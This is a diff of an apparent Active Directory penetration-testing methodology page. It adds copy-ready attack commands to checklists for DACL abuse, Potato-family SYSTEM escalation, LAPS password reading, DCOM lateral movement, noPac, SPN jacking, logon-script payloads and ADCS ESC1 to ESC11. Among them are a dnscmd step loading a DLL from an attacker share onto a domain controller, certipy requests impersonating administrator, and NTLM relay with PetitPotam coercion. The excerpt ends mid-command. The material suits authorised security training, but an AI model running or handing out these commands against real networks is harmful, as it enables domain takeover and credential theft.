+<li><input type="checkbox" data-id="cape-dacl2-dnsadmin-wf-2"> Register with <code>dnscmd /config /serverlevelplugindll</code>, then restart the DNS service to trigger load as SYSTEM.
+<pre><code class="language-bash">dnscmd &lt;dc&gt; /config /serverlevelplugindll \\attacker\share\adduser.dll
+sc.exe \\&lt;dc&gt; stop dns
+sc.exe \\&lt;dc&gt; start dns</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-dacl2-seimpersonate">8.8 Exploiting SeImpersonatePrivilege (Potato Family)</h3>
@@ -2073,9 +2216,19 @@ GodPotato-NET4.exe -cmd "cmd /c &lt;payload&gt;.exe"</code></pre>
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-dacl2-seimp-wf-0"> Confirm <code>SeImpersonatePrivilege</code> with <code>whoami /priv | findstr SeImpersonate</code>.</li>
-<li><input type="checkbox" data-id="cape-dacl2-seimp-wf-1"> Pick the variant that matches the OS: PrintSpoofer where Spooler is up, GodPotato on modern Windows 11, RoguePotato when the local resolver is locked down.</li>
-<li><input type="checkbox" data-id="cape-dacl2-seimp-wf-2"> Run the variant with <code>-c "&lt;payload&gt;"</code> to land as SYSTEM.</li>
+<li><input type="checkbox" data-id="cape-dacl2-seimp-wf-0"> Confirm <code>SeImpersonatePrivilege</code> with <code>whoami /priv | findstr SeImpersonate</code>.
+<pre><code class="language-bash">whoami /priv | findstr SeImpersonate</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-dacl2-seimp-wf-1"> Pick the variant that matches the OS: PrintSpoofer where Spooler is up, GodPotato on modern Windows 11, RoguePotato when the local resolver is locked down.
+<pre><code class="language-bash"># Check the Spooler service state to decide between PrintSpoofer and the DCOM variants
+sc.exe query spooler
+# Grab OS build to map to the working potato
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-dacl2-seimp-wf-2"> Run the variant with <code>-c "&lt;payload&gt;"</code> to land as SYSTEM.
+<pre><code class="language-bash">PrintSpoofer64.exe -i -c cmd
+GodPotato-NET4.exe -cmd "cmd /c whoami"</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-dacl2-laps">8.9 Reading LAPS Passwords</h3>
@@ -2100,8 +2253,15 @@ bloodyAD --host &lt;dc-ip&gt; -u &lt;user&gt; -p '&lt;password&gt;' -d &lt;domai
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-dacl2-laps-wf-0"> Enumerate which principals hold <em>All Extended Rights</em> or explicit read on <code>ms-Mcs-AdmPwd</code> / <code>msLAPS-Password</code>.</li>
-<li><input type="checkbox" data-id="cape-dacl2-laps-wf-1"> Read the current value with <code>Get-LapsADPassword</code>, <code>Get-ADComputer -Properties ms-Mcs-AdmPwd</code>, or <code>netexec -M laps</code>.</li>
+<li><input type="checkbox" data-id="cape-dacl2-laps-wf-0"> Enumerate which principals hold <em>All Extended Rights</em> or explicit read on <code>ms-Mcs-AdmPwd</code> / <code>msLAPS-Password</code>.
+<pre><code class="language-powershell">Find-AdmPwdExtendedRights -Identity &lt;ou-name&gt;
+Get-DomainObjectAcl -Identity &lt;computer&gt; -ResolveGUIDs | ? { $_.ObjectAceType -match 'ms-Mcs-AdmPwd|msLAPS-Password' }</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-dacl2-laps-wf-1"> Read the current value with <code>Get-LapsADPassword</code>, <code>Get-ADComputer -Properties ms-Mcs-AdmPwd</code>, or <code>netexec -M laps</code>.
+<pre><code class="language-powershell">Get-ADComputer &lt;computer&gt; -Properties ms-Mcs-AdmPwd | Select-Object name, ms-Mcs-AdmPwd
+Get-LapsADPassword -Identity &lt;computer&gt; -AsPlainText
+netexec ldap &lt;dc-ip&gt; -u user -p pass -M laps</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-dacl2-dcom-lateral">8.10 DCOM Lateral Movement Objects</h3>
@@ -2123,9 +2283,18 @@ $obj.Document.Application.ShellExecute('cmd.exe', '/c &lt;payload&gt;', 'C:\', $
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-dacl2-dcom-lateral-wf-0"> Confirm local admin on the target and that DCOM (135/tcp + dynamic RPC) is reachable.</li>
-<li><input type="checkbox" data-id="cape-dacl2-dcom-lateral-wf-1"> Pick the DCOM object the target still exposes: <code>MMC20.Application</code>, <code>ShellWindows</code>, or <code>ShellBrowserWindow</code>.</li>
-<li><input type="checkbox" data-id="cape-dacl2-dcom-lateral-wf-2"> Instantiate via <code>GetTypeFromProgID</code> and call <code>ExecuteShellCommand</code> or <code>ShellExecute</code> from PowerShell.</li>
+<li><input type="checkbox" data-id="cape-dacl2-dcom-lateral-wf-0"> Confirm local admin on the target and that DCOM (135/tcp + dynamic RPC) is reachable.
+<pre><code class="language-powershell">whoami /groups | Select-String Admin
+Test-NetConnection &lt;target&gt; -Port 135</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-dacl2-dcom-lateral-wf-1"> Pick the DCOM object the target still exposes: <code>MMC20.Application</code>, <code>ShellWindows</code>, or <code>ShellBrowserWindow</code>.
+<pre><code class="language-powershell"># MMC20.Application, ShellWindows, ShellBrowserWindow</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-dacl2-dcom-lateral-wf-2"> Instantiate via <code>GetTypeFromProgID</code> and call <code>ExecuteShellCommand</code> or <code>ShellExecute</code> from PowerShell.
+<pre><code class="language-powershell">$com = [Type]::GetTypeFromProgID('MMC20.Application', '&lt;target&gt;')
+$obj = [System.Activator]::CreateInstance($com)
+$obj.Document.ActiveView.ExecuteShellCommand('cmd.exe', $null, '/c &lt;payload&gt;', 'Minimized')</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-dacl2-noPac">8.11 sAMAccountName Spoofing (noPac / CVE-2021-42278)</h3>
@@ -2154,8 +2323,13 @@ getST.py -self -impersonate administrator -spn "cifs/&lt;dc-fqdn&gt;" -dc-ip &lt
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-dacl2-nopac-wf-0"> Verify the DC is unpatched against CVE-2021-42278 / CVE-2021-42287.</li>
-<li><input type="checkbox" data-id="cape-dacl2-nopac-wf-1"> Run <code>noPac.py -impersonate administrator -use-ldap</code> as any authenticated user.</li>
+<li><input type="checkbox" data-id="cape-dacl2-nopac-wf-0"> Verify the DC is unpatched against CVE-2021-42278 / CVE-2021-42287.
+<pre><code class="language-bash">wmic qfe list brief | findstr /I "5008380 5008102"</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-dacl2-nopac-wf-1"> Run <code>noPac.py -impersonate administrator -use-ldap</code> as any authenticated user.
+<pre><code class="language-bash">python3 noPac.py -dc-ip &lt;dc-ip&gt; domain.local/user:pass -impersonate administrator -use-ldap
+python3 noPac.py -dc-ip &lt;dc-ip&gt; domain.local/user:pass -impersonate administrator -use-ldap -shell</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-dacl2-spn-jacking">8.12 SPN Jacking</h3>
@@ -2171,8 +2345,14 @@ Set-DomainObject -Identity &lt;attacker-account&gt; -Clear serviceprincipalname<
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-dacl2-spn-jacking-wf-0"> Confirm <code>WriteSPN</code> or full write access on a controlled service account.</li>
-<li><input type="checkbox" data-id="cape-dacl2-spn-jacking-wf-1"> Move the victim SPN onto the controlled account with <code>Set-DomainObject</code>, request the ticket, then clear the SPN back.</li>
+<li><input type="checkbox" data-id="cape-dacl2-spn-jacking-wf-0"> Confirm <code>WriteSPN</code> or full write access on a controlled service account.
+<pre><code class="language-powershell">Get-DomainObjectAcl -Identity &lt;target-service-account&gt; -ResolveGUIDs | ? { $_.ObjectAceType -match 'Service-Principal-Name' -or $_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite' }</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-dacl2-spn-jacking-wf-1"> Move the victim SPN onto the controlled account with <code>Set-DomainObject</code>, request the ticket, then clear the SPN back.
+<pre><code class="language-powershell">Set-DomainObject -Identity &lt;attacker-account&gt; -Set @{serviceprincipalname='cifs/&lt;victim-fqdn&gt;'}
+Rubeus.exe asktgs /service:cifs/&lt;victim-fqdn&gt; /ticket:&lt;user-tgt&gt; /ptt
+Set-DomainObject -Identity &lt;attacker-account&gt; -Clear serviceprincipalname</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-dacl2-logon-scripts">8.13 Logon Script Attacks</h3>
@@ -2186,8 +2366,12 @@ copy payload.bat "\\&lt;dc-fqdn&gt;\SYSVOL\&lt;domain&gt;\Policies\{&lt;gpo-guid
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-dacl2-logon-wf-0"> User variant: hold <code>GenericWrite</code> on the target user and set <code>scriptPath</code> to a UNC on your share.</li>
-<li><input type="checkbox" data-id="cape-dacl2-logon-wf-1"> GPO variant: hold write on the GPO's SYSVOL directory and drop a payload under <code>Scripts\Logon</code>.</li>
+<li><input type="checkbox" data-id="cape-dacl2-logon-wf-0"> User variant: hold <code>GenericWrite</code> on the target user and set <code>scriptPath</code> to a UNC on your share.
+<pre><code class="language-powershell">Set-DomainObject -Identity &lt;target-user&gt; -Set @{scriptPath='\\&lt;attacker-share&gt;\payload.bat'}</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-dacl2-logon-wf-1"> GPO variant: hold write on the GPO's SYSVOL directory and drop a payload under <code>Scripts\Logon</code>.
+<pre><code class="language-bash">copy payload.bat "\\&lt;dc-fqdn&gt;\SYSVOL\&lt;domain&gt;\Policies\{&lt;gpo-guid&gt;}\User\Scripts\Logon\"</code></pre>
+</li>
 </ul>
 
 <h2 id="cape-adcs-9">9. ADCS Attacks</h2>
@@ -2227,9 +2411,15 @@ copy payload.bat "\\&lt;dc-fqdn&gt;\SYSVOL\&lt;domain&gt;\Policies\{&lt;gpo-guid
 <pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc&gt; -vulnerable -stdout</code></pre>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-adcs-enum-wf-0"> Enumerate every template and its permissions with <code>certipy find</code>.</li>
-<li><input type="checkbox" data-id="cape-adcs-enum-wf-1"> Filter for templates flagged ESC1 through ESC15 in Certipy's analysis output.</li>
-<li><input type="checkbox" data-id="cape-adcs-enum-wf-2"> Note any CA-level flags (<code>EDITF_ATTRIBUTESUBJECTALTNAME2</code>) and writable PKI-object DACLs Certipy surfaces alongside the template list.</li>
+<li><input type="checkbox" data-id="cape-adcs-enum-wf-0"> Enumerate every template and its permissions with <code>certipy find</code>.
+<pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc-ip&gt; -vulnerable -stdout</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-adcs-enum-wf-1"> Filter for templates flagged ESC1 through ESC15 in Certipy's analysis output.
+<pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc-ip&gt; -vulnerable -stdout | grep -E 'ESC[0-9]+'</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-adcs-enum-wf-2"> Note any CA-level flags (<code>EDITF_ATTRIBUTESUBJECTALTNAME2</code>) and writable PKI-object DACLs Certipy surfaces alongside the template list.
+<pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc-ip&gt; -vulnerable -stdout -old-bloodhound</code></pre>
+</li>
 </ul>
 
 <h4 id="cape-adcs-certutil">9.2.1 certutil.exe from the Target</h4>
@@ -2272,9 +2462,15 @@ openssl pkcs12 -in cert.pfx -clcerts -nokeys -out cert.pem</code></pre>
 certipy req -u user@domain.local -p <password> -target dc.domain.local -template VulnTemplate -upn administrator@domain.local -ca 'domain-DC-CA'</code></pre>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-adcs-esc1-wf-0"> Confirm the template has <code>ENROLLEE_SUPPLIES_SUBJECT</code>, Client Auth or Smart Card Logon EKU, and low-priv enrolment.</li>
-<li><input type="checkbox" data-id="cape-adcs-esc1-wf-1"> Request a certificate with <code>-upn administrator@&lt;domain&gt;</code> using <code>certipy req</code>.</li>
-<li><input type="checkbox" data-id="cape-adcs-esc1-wf-2"> Authenticate with the certificate to obtain a TGT and the target's NTLM hash.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc1-wf-0"> Confirm the template has <code>ENROLLEE_SUPPLIES_SUBJECT</code>, Client Auth or Smart Card Logon EKU, and low-priv enrolment.
+<pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc-ip&gt; -template &lt;template-name&gt; -stdout</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-adcs-esc1-wf-1"> Request a certificate with <code>-upn administrator@&lt;domain&gt;</code> using <code>certipy req</code>.
+<pre><code class="language-bash">certipy req -u user@domain.local -p pass -target dc.domain.local -template VulnTemplate -upn administrator@domain.local -ca 'domain-DC-CA'</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-adcs-esc1-wf-2"> Authenticate with the certificate to obtain a TGT and the target's NTLM hash.
+<pre><code class="language-bash">certipy auth -pfx administrator.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
+</li>
 </ul>
 
 <h4 id="cape-adcs-esc2">9.3.5 ESC2, Any Purpose EKU</h4>
@@ -2283,8 +2479,12 @@ certipy req -u user@domain.local -p <password> -target dc.domain.local -template
 certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template &lt;esc2-template&gt; -ca '&lt;ca-name&gt;'</code></pre>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-adcs-esc2-wf-0"> Confirm the template's EKU list contains <code>Any Purpose</code> (OID <code>2.5.29.37.0</code>) or is empty.</li>
-<li><input type="checkbox" data-id="cape-adcs-esc2-wf-1"> Enrol as your current user; the CA fixes the subject but the certificate authenticates via PKINIT anyway.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc2-wf-0"> Confirm the template's EKU list contains <code>Any Purpose</code> (OID <code>2.5.29.37.0</code>) or is empty.
+<pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc-ip&gt; -stdout | grep -A2 'Any Purpose'</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-adcs-esc2-wf-1"> Enrol as your current user; the CA fixes the subject but the certificate authenticates via PKINIT anyway.
+<pre><code class="language-bash">certipy req -u user@domain.local -p pass -target dc.domain.local -template &lt;esc2-template&gt; -ca 'domain-DC-CA'</code></pre>
+</li>
 </ul>
 
 <h4 id="cape-adcs-esc3">9.3.6 ESC3, Certificate Request Agent</h4>
@@ -2296,8 +2496,13 @@ certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &
 certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template 'User' -on-behalf-of '&lt;domain&gt;\administrator' -pfx agent.pfx -ca '&lt;ca-name&gt;'</code></pre>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-adcs-esc3-wf-0"> Locate a template carrying the <code>Certificate Request Agent</code> EKU that Domain Users can enrol in.</li>
-<li><input type="checkbox" data-id="cape-adcs-esc3-wf-1"> Enrol for the agent template, then submit an <code>-on-behalf-of</code> request for a Domain Admin against a Client Auth template.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc3-wf-0"> Locate a template carrying the <code>Certificate Request Agent</code> EKU that Domain Users can enrol in.
+<pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc-ip&gt; -stdout | grep -A2 'Certificate Request Agent'</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-adcs-esc3-wf-1"> Enrol for the agent template, then submit an <code>-on-behalf-of</code> request for a Domain Admin against a Client Auth template.
+<pre><code class="language-bash">certipy req -u user@domain.local -p pass -target dc.domain.local -template 'CertRequestAgent' -ca 'domain-DC-CA'
+certipy req -u user@domain.local -p pass -target dc.domain.local -template 'User' -on-behalf-of 'domain\administrator' -pfx agent.pfx -ca 'domain-DC-CA'</code></pre>
+</li>
 </ul>
 
 <h4 id="cape-adcs-esc4">9.3.7 ESC4, Vulnerable Template DACL</h4>
@@ -2312,8 +2517,14 @@ certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &
 certipy template -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -template &lt;template-name&gt; -configuration &lt;saved-config&gt;</code></pre>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-adcs-esc4-wf-0"> Confirm write access on the template object (<code>WriteDacl</code>, <code>WriteOwner</code>, <code>GenericAll</code>, or <code>GenericWrite</code>).</li>
-<li><input type="checkbox" data-id="cape-adcs-esc4-wf-1"> Save the original template configuration, rewrite into an ESC1 shape, request a cert as an admin, then restore.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc4-wf-0"> Confirm write access on the template object (<code>WriteDacl</code>, <code>WriteOwner</code>, <code>GenericAll</code>, or <code>GenericWrite</code>).
+<pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc-ip&gt; -vulnerable -stdout | grep -B1 -A5 'ESC4'</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-adcs-esc4-wf-1"> Save the original template configuration, rewrite into an ESC1 shape, request a cert as an admin, then restore.
+<pre><code class="language-bash">certipy template -u user@domain.local -p pass -template &lt;template-name&gt; -save-old
+certipy req -u user@domain.local -p pass -target dc.domain.local -template &lt;template-name&gt; -upn administrator@domain.local -ca 'domain-DC-CA'
+certipy template -u user@domain.local -p pass -template &lt;template-name&gt; -configuration &lt;saved-config&gt;</code></pre>
+</li>
 </ul>
 
 <h4 id="cape-adcs-esc5">9.3.8 ESC5, Vulnerable PKI Object DACL</h4>
@@ -2322,8 +2533,13 @@ certipy template -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -tem
 certipy find -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -dc-ip &lt;dc-ip&gt; -vulnerable -stdout</code></pre>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-adcs-esc5-wf-0"> Identify writable DACLs on the CA object, Enrollment Services container, or the NTAuthCertificates object.</li>
-<li><input type="checkbox" data-id="cape-adcs-esc5-wf-1"> Rewrite the DACL to grant yourself <code>ManageCA</code> or template-write, then pivot into ESC4 or ESC7 for the actual escalation.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc5-wf-0"> Identify writable DACLs on the CA object, Enrollment Services container, or the NTAuthCertificates object.
+<pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc-ip&gt; -vulnerable -stdout | grep -A5 'ESC5'</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-adcs-esc5-wf-1"> Rewrite the DACL to grant yourself <code>ManageCA</code> or template-write, then pivot into ESC4 or ESC7 for the actual escalation.
+<pre><code class="language-bash"># Grant self ManageCA / template-write via BloodyAD, then pivot into ESC4/ESC7
+bloodyAD --host &lt;dc-ip&gt; -u user -p pass -d domain.local add uac &lt;ca-obj&gt; -f MANAGE_CA</code></pre>
+</li>
 </ul>
 
 <h4 id="cape-adcs-esc6">9.3.9 ESC6, EDITF_ATTRIBUTESUBJECTALTNAME2</h4>
@@ -2335,8 +2551,12 @@ certipy find -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -dc-ip &
 certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template 'User' -upn administrator@&lt;domain.local&gt; -ca '&lt;ca-name&gt;'</code></pre>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-adcs-esc6-wf-0"> Confirm <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> is set on the CA (Certipy reports it in the CA info block).</li>
-<li><input type="checkbox" data-id="cape-adcs-esc6-wf-1"> Enrol against any Client Authentication template with <code>-upn administrator@&lt;domain&gt;</code>.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc6-wf-0"> Confirm <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> is set on the CA (Certipy reports it in the CA info block).
+<pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc-ip&gt; -stdout | grep EDITF_ATTRIBUTESUBJECTALTNAME2</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-adcs-esc6-wf-1"> Enrol against any Client Authentication template with <code>-upn administrator@&lt;domain&gt;</code>.
+<pre><code class="language-bash">certipy req -u user@domain.local -p pass -target dc.domain.local -template 'User' -upn administrator@domain.local -ca 'domain-DC-CA'</code></pre>
+</li>
 </ul>
 
 <h4 id="cape-adcs-esc7">9.3.10 ESC7, Vulnerable CA Access Control</h4>
@@ -2352,8 +2572,15 @@ certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &
 certipy ca -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -ca '&lt;ca-name&gt;' -issue-request &lt;request-id&gt;</code></pre>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-adcs-esc7-wf-0"> Verify you hold <code>ManageCA</code> and/or <code>ManageCertificates</code> on the CA object.</li>
-<li><input type="checkbox" data-id="cape-adcs-esc7-wf-1"> Grant yourself CA officer rights, then either flip the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag to pivot into ESC6, or submit-and-approve a request under a Client Auth template.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc7-wf-0"> Verify you hold <code>ManageCA</code> and/or <code>ManageCertificates</code> on the CA object.
+<pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc-ip&gt; -stdout | grep -A2 'ManageCA\|ManageCertificates'</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-adcs-esc7-wf-1"> Grant yourself CA officer rights, then either flip the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag to pivot into ESC6, or submit-and-approve a request under a Client Auth template.
+<pre><code class="language-bash">certipy ca -u user@domain.local -p pass -ca 'domain-DC-CA' -add-officer user
+certipy ca -u user@domain.local -p pass -ca 'domain-DC-CA' -enable-flag EDITF_ATTRIBUTESUBJECTALTNAME2
+certipy req -u user@domain.local -p pass -target dc.domain.local -template 'SubCA' -upn administrator@domain.local -ca 'domain-DC-CA'
+certipy ca -u user@domain.local -p pass -ca 'domain-DC-CA' -issue-request &lt;request-id&gt;</code></pre>
+</li>
 </ul>
 
 <h4 id="cape-adcs-esc8">9.3.11 ESC8, Web Enrollment NTLM Relay</h4>
@@ -2372,9 +2599,16 @@ python3 printerbug.py &lt;domain&gt;/&lt;user&gt;:'&lt;password&gt;'@&lt;target-
 certipy auth -pfx &lt;dc&gt;.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-adcs-esc8-wf-0"> Confirm <code>/certsrv/</code> Web Enrollment is reachable and accepts NTLM without EPA / channel binding.</li>
-<li><input type="checkbox" data-id="cape-adcs-esc8-wf-1"> Start <code>ntlmrelayx --adcs --template DomainController</code> against the Web Enrollment endpoint.</li>
-<li><input type="checkbox" data-id="cape-adcs-esc8-wf-2"> Coerce the target with PetitPotam, DFSCoerce, or PrinterBug and authenticate with the relayed certificate.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc8-wf-0"> Confirm <code>/certsrv/</code> Web Enrollment is reachable and accepts NTLM without EPA / channel binding.
+<pre><code class="language-bash">curl -sk https://&lt;ca-fqdn&gt;/certsrv/ -I</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-adcs-esc8-wf-1"> Start <code>ntlmrelayx --adcs --template DomainController</code> against the Web Enrollment endpoint.
+<pre><code class="language-bash">ntlmrelayx.py -t http://&lt;ca-fqdn&gt;/certsrv/certfnsh.asp --adcs --template DomainController</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-adcs-esc8-wf-2"> Coerce the target with PetitPotam, DFSCoerce, or PrinterBug and authenticate with the relayed certificate.
+<pre><code class="language-bash">python3 PetitPotam.py -u user -p pass -d domain.local &lt;attacker-ip&gt; &lt;target-dc&gt;
+certipy auth -pfx &lt;dc&gt;.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
+</li>
 </ul>
 
 <h4 id="cape-adcs-esc9">9.3.12 ESC9, No Security Extension</h4>
@@ -2393,8 +2627,15 @@ certipy account -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -user
 certipy auth -pfx &lt;sacrificial-user&gt;.pfx -domain &lt;domain.local&gt; -username administrator</code></pre>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-adcs-esc9-wf-0"> Confirm the template has <code>CT_FLAG_NO_SECURITY_EXTENSION</code> and you hold <code>GenericWrite</code> over a sacrificial account.</li>
-<li><input type="checkbox" data-id="cape-adcs-esc9-wf-1"> Swap the sacrificial account's UPN to the target, enrol, revert the UPN, then authenticate.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc9-wf-0"> Confirm the template has <code>CT_FLAG_NO_SECURITY_EXTENSION</code> and you hold <code>GenericWrite</code> over a sacrificial account.
+<pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc-ip&gt; -vulnerable -stdout | grep -A5 ESC9</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-adcs-esc9-wf-1"> Swap the sacrificial account's UPN to the target, enrol, revert the UPN, then authenticate.
+<pre><code class="language-bash">certipy account -u user@domain.local -p pass -user &lt;sacrificial-user&gt; -upn administrator update
+certipy req -u &lt;sacrificial-user&gt;@domain.local -p pass -target dc.domain.local -template &lt;esc9-template&gt; -ca 'domain-DC-CA'
+certipy account -u user@domain.local -p pass -user &lt;sacrificial-user&gt; -upn &lt;sacrificial-user&gt;@domain.local update
+certipy auth -pfx &lt;sacrificial-user&gt;.pfx -domain domain.local -username administrator</code></pre>
+</li>
 </ul>
 
 <h4 id="cape-adcs-esc10">9.3.13 ESC10, Weak Certificate Mappings</h4>
@@ -2407,8 +2648,16 @@ certipy account -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -user
 certipy auth -pfx &lt;sacrificial-user&gt;.pfx -domain &lt;domain.local&gt; -username administrator</code></pre>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-adcs-esc10-wf-0"> Read the DC's <code>CertificateMappingMethods</code> and <code>StrongCertificateBindingEnforcement</code> registry values.</li>
-<li><input type="checkbox" data-id="cape-adcs-esc10-wf-1"> With weak enforcement, use the same UPN-swap flow as ESC9 against any Client Auth template.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc10-wf-0"> Read the DC's <code>CertificateMappingMethods</code> and <code>StrongCertificateBindingEnforcement</code> registry values.
+<pre><code class="language-powershell">Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\Kdc' | Select-Object StrongCertificateBindingEnforcement
+Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel' | Select-Object CertificateMappingMethods</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-adcs-esc10-wf-1"> With weak enforcement, use the same UPN-swap flow as ESC9 against any Client Auth template.
+<pre><code class="language-bash">certipy account -u user@domain.local -p pass -user &lt;sacrificial-user&gt; -upn administrator update
+certipy req -u &lt;sacrificial-user&gt;@domain.local -p pass -target dc.domain.local -template User -ca 'domain-DC-CA'
+certipy account -u user@domain.local -p pass -user &lt;sacrificial-user&gt; -upn &lt;sacrificial-user&gt;@domain.local update
+certipy auth -pfx &lt;sacrificial-user&gt;.pfx -domain domain.local -username administrator</code></pre>
+</li>
 </ul>
 
 <h4 id="cape-adcs-esc11">9.3.14 ESC11, Relay to ICPR</h4>
@@ -2420,8 +2669,13 @@ ntlmrelayx.py -t rpc://&lt;ca-fqdn&gt; -rpc-mode ICPR -icpr-ca-name '&lt;ca-name
 python3 PetitPotam.py -u &lt;user&gt; -p '&lt;password&gt;' -d &lt;domain&gt; &lt;attacker-ip&gt; &lt;target-dc&gt;</code></pre>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-adcs-esc11-wf-0"> Confirm ICPR does not enforce <code>IF_ENFORCEENCRYPTICERTREQUEST</code>.</li>
-<li><input type="checkbox" data-id="cape-adcs-esc11-wf-1"> Start <code>ntlmrelayx -t rpc://&lt;ca&gt; -rpc-mode ICPR</code> and trigger any coercion primitive.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc11-wf-0"> Confirm ICPR does not enforce <code>IF_ENFORCEENCRYPTICERTREQUEST</code>.
+<pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc-ip&gt; -stdout | grep -A2 IF_ENFORCEENCRYPTICERTREQUEST</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-adcs-esc11-wf-1"> Start <code>ntlmrelayx -t rpc://&lt;ca&gt; -rpc-mode ICPR</code> and trigger any coercion primitive.
+<pre><code class="language-bash">ntlmrelayx.py -t rpc://&lt;ca-fqdn&gt; -rpc-mode ICPR -icpr-ca-name 'domain-DC-CA' --adcs --template DomainController
